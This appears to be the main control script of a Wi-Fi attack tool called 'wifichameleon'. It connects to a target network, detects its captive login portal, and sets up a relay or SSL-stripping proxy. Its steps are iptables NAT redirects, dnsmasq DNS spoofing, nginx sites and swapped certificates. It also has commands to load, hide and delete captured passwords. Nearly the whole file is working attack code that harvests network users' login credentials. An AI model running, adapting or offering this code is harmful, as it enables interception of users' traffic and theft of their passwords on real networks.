import json, subprocess, time, argparse, os
from wifichameleon.daemons import DaemonMgr, WlanMgr, DHCPMgr, DnsmasqMgr, NginxMgr
from wifichameleon.utils import captive_detect
from wifichameleon.relay.build_relay import build_relay, build_strip_relay
from wifichameleon.utils import util
from wifichameleon.utils.errors import error
import checker
from wifichameleon.config import CONN_INTERFACE, STRIP_MODE, SUBDOMAIN, AP_NAME
from pathlib import Path
from urllib.parse import urlparse
import socket

util.requireRoot()

def get_ipv4_by_hostname(hostname):
    # see `man getent` `/ hosts `
    # see `man getaddrinfo`

    return list(
        i        # raw socket structure
            [4]  # internet protocol info
            [0]  # address
        for i in 
        socket.getaddrinfo(
            hostname,
            0  # port, required
        )
        if i[0] is socket.AddressFamily.AF_INET  # ipv4

        # ignore duplicate addresses with other socket types
        and i[1] is socket.SocketKind.SOCK_RAW  
    )

def silent_run(cmd):
    subprocess.run(
        cmd.split(" "),
        stdout=subprocess.DEVNULL, 
        stderr=subprocess.DEVNULL
    )

def clean_up():
    # Restore DNS settings
    dnsmasq = DnsmasqMgr()
    dnsmasq.setConf()
    dnsmasq.restart()

    # Cleanup nginx configs
    nginx = NginxMgr()
    nginx.set_redirection_location("http://portal.wifi-chameleon.edu.tw/")
    nginx.set_portal_configs("")

    # Cleanup nginx enabled sites
    nginx.disable_all()
    nginx.enable_default()
    nginx.restart()

    # Cleanup iptables
    silent_run("iptables -t nat -F PREROUTING")

    # Remove portal & certificate
    path = [Path(__file__).parent.parent / "portal", Path(__file__).parent.parent / "certificate"]
    for _path in path:
        if os.path.isdir(_path):
            os.unlink(_path)

def stop_attack():
    WlanMgr.disconnect(CONN_INTERFACE)
    silent_run("iptables -t nat -F PREROUTING")
    DaemonMgr("strip").stop()
    DaemonMgr("relay").stop()
    DaemonMgr("mitm").stop()

def start_attack(ssid):
    silent_run("iptables -t nat -F PREROUTING")
    success = WlanMgr.connect(CONN_INTERFACE, ssid)
    if success:
        print(f"[*] Connected to {ssid}")
    else:
        error(f"Can not connect to {ssid}")
        exit(-1)
    dns = None
    for _ in range(3):
        try:
            dns = DHCPMgr.parseLeaseDNS(CONN_INTERFACE, ssid)
        except:
            time.sleep(1)
    if dns is None:
        error(f"DHCP lease does not exist")
        stop_attack()
        exit(-1)
    DHCPMgr.setConfDNS(dns)
    try:
        has_https, url = captive_detect.detect()
    except:
        error("Login URL not detected")
        stop_attack()
        exit(-1)
    print("[*] Login URL found")
    subdomain = "wireless"
    settings = {
        "ssid": ssid,
        "has_https": has_https == "https",
        "real_url": has_https + "://" + url,
        "subdomain": SUBDOMAIN,
        "attacker_url": "http://"+url if STRIP_MODE else f"https://{subdomain}.wifi-chameleon.edu.tw"
    }
    util.write_settings(settings)
    success = False
    if STRIP_MODE:
        print("[*] Building relay server in strip mode")
        silent_run("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 5000")
        success = build_strip_relay()
    else:
        print("[*] Loading certificate")
        set_certificate("default")
        print("[*] Building relay server")
        success = build_relay(subdomain)
    if success:
        print("[*] Relay server is now running")
        exit(0)
    else:
        error("Building server failed")
        stop_attack()
        exit(-1)

def run_HTTP_test_portal():
    # Set default portal
    set_portal("default")
    
    # Set defualt certificate
    set_certificate("default")

    # Add default DNS resolution to local IP
    dnsmasq = DnsmasqMgr()
    dnsmasq.setConf(domains=[("#", "10.1.0.1")])
    dnsmasq.restart()

    # Add HTTP portal site and default redirect site
    nginx = NginxMgr()
    nginx.set_portal_configs("")
    nginx.enable_site("portal")
    nginx.enable_site("default")
    nginx.restart()

def set_portal(portal):
    nginx = NginxMgr()
    dnsmasq = DnsmasqMgr()
    # Samsun hack
    silent_run("iptables -t nat -F PREROUTING")
    silent_run("iptables -t nat -A PREROUTING -d 123.123.123.123 -j DNAT --to-destination 127.0.0.1")
    # if portal is an URL
    if "://" in portal:
        dnsmasq.setConf()
        dnsmasq.restart()

        portals = portal.split(",")
        for _ in range(3):
            ips = None
            try:
                ips = [get_ipv4_by_hostname(urlparse(_portal).hostname) for _portal in portals]
            except:
                pass
            if ips is not None and all([len(ip) != 0 for ip in ips]):
                break
            print("Name resolution failed...Retrying")
        if any([len(ip) == 0 for ip in ips]):
            error(f"Can not resolve portal domain")
            exit(-1)

        nginx.set_redirection_location(portals[0])
        nginx.restart()

        new_domains = [(urlparse(portals[i]).hostname, ips[i][0]) for i in range(len(portals))]
        new_domains.append(("#", "123.123.123.123"))
        dnsmasq.setConf(domains=new_domains)
        # dnsmasq.setConf(domains=[(urlparse(portal).hostname, ip[0]), ("#", "10.1.0.1")])
        dnsmasq.restart()
        
    # if portal is static files
    else:
        nginx.set_redirection_location("http://portal.wifi-chameleon.edu/")
        if not (Path(__file__).parent.parent / "portals" / portal).is_dir():
            error(f"Can not find portal {portal}")
            exit(-1)
        if (Path(__file__).parent.parent / "portal").is_symlink():
            os.unlink(Path(__file__).parent.parent / "portal")
        os.symlink(Path(__file__).parent.parent / "portals" / portal, Path(__file__).parent.parent / "portal")
        nginx.enable_site("portal")
        nginx.restart()

        dnsmasq.setConf(domains=[("#", "123.123.123.123")])
        dnsmasq.restart()

def set_certificate(certificate):
    # set certificate files
    if not (Path(__file__).parent.parent / "certificates" / certificate).is_dir():
        error(f"Can not find certificate {certificate}")
        exit(-1)
    if (Path(__file__).parent.parent / "certificate").is_symlink():
        os.unlink(Path(__file__).parent.parent / "certificate")
    os.symlink(Path(__file__).parent.parent / "certificates" / certificate, Path(__file__).parent.parent / "certificate")
    NginxMgr().restart()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('command')
    parser.add_argument('param', nargs="?")
    args = parser.parse_args()
    cmd, param = args.command, args.param

    if cmd == "scan":
        ssid_to_ap = {}
        result = WlanMgr.scan(CONN_INTERFACE)
        for ap in result:
            if ap['flags'] != "[ESS]":
                continue
            if ap['ssid'] not in ssid_to_ap:
                ssid_to_ap[ap['ssid']] = ap
            else:
                level = int(ap['signal level'])
                if level > int(ssid_to_ap[ap['ssid']]['signal level']):
                    ssid_to_ap[ap['ssid']] = ap
        print(json.dumps([ssid_to_ap[key] for key in ssid_to_ap.keys()]))
  
    elif cmd == "status":
        status = checker.getStatus()
        print(json.dumps(status))
  
    elif cmd == "connection_status":
        print(json.dumps(WlanMgr.getStatus(CONN_INTERFACE)))

    elif cmd == "get_known_wifi":
        print(json.dumps(WlanMgr.getNetworks(CONN_INTERFACE)))
    
    elif cmd == "connect_wifi":
        if param is None:
            error("Please specify a SSID")
            exit(-1)
        if WlanMgr.connect(CONN_INTERFACE, param):
            exit(0)
        else:
            error("Connect Wi-Fi failed")
            exit(-1)

    elif cmd == "attack":
        if param is None:
            error("Please specify a SSID")
            exit(-1)
        start_attack(param)
  
    elif cmd == 'http_portal':
        run_HTTP_test_portal()

    elif cmd == "stop_attack":
        stop_attack()
    
    elif cmd == "set_mode":
        if param is None or (param != "redirect" and param != "strip"):
            error("Please specify a mode: 'redirect' or 'strip'")
            exit(-1)
        util.set_config("STRIP_MODE", param == "strip")
  
    elif cmd == "get_mode":
        print("strip" if STRIP_MODE else "redirect", end="")
  
    elif cmd == "get_config" and param is not None:
        if param == "ap_name":
            print(AP_NAME)
        elif param == "subdomain":
            print(SUBDOMAIN)
  
    elif cmd == "load_password":
        id_to_data = util.load_password()
        print(json.dumps([id_to_data[key] for key in id_to_data.keys()]))
  
    elif cmd == "hide_password" and param is not None:
        if util.hide_password(param):
            print("OK")
        else:
            error(f"Hide password {param} failed")
            exit(-1)
  
    elif cmd == "delete_password" and param is not None:
        if util.delete_password(param):
            print("OK")
        else:
            error(f"Delete password {param} failed")

    elif cmd == "set_portal" and param is not None:
        if param is None:
            error("Please specify a portal")
            exit(-1)
        set_portal(param)

    elif cmd == "set_certificate" and param is not None:
        if param is None:
            error("Please specify a certificate")
            exit(-1)
        set_certificate(param)

    elif cmd == "cleanup":
        clean_up()

    else:
        parser.print_help()
        exit(-1)
